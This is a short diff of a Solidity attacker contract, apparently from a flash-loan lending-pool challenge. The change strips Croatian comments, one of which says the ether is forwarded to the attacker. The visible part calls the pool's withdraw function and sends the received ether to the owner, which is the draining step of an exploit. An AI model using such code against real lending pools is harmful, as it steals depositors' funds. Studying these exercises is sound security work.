@@ -29,7 +29,7 @@ contract FlashLoanEtherReceiver {
         ILenderPool(poolAddress).withdraw();
     }
 
-    receive() external payable {//za prihvat ethera iz withdraw funkcije gdje se šalju sa .sendValue() utlitiy funkcijom
-        payable(owner).transfer(msg.value);//prenesi ih napadacu-> owneru
+    receive() external payable {
+        payable(owner).transfer(msg.value);
     }
 }
